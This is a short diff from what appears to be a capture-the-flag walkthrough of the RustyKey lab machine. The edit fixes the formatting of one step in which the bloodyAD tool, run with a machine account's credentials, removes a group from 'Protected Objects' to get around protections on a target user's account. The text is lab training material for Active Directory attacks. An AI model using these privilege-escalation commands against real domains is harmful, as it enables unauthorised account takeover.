@@ -93,7 +93,7 @@
 
 15. Tried changing bb.morgan's password and log in but can't because bb.morgan is part of the Protected Objects group. After looking at Bloodhound again, Helpdesk group has AddMember rights on Protected Objects so remove IT group from the protected group first.
 
-`sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' remove groupMember 'Protected Objects' IT
+`sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' remove groupMember 'Protected Objects' IT`
 
 ![image](https://github.com/user-attachments/assets/75bb0296-adce-4b05-bcb0-ee58d7393b6f)
 
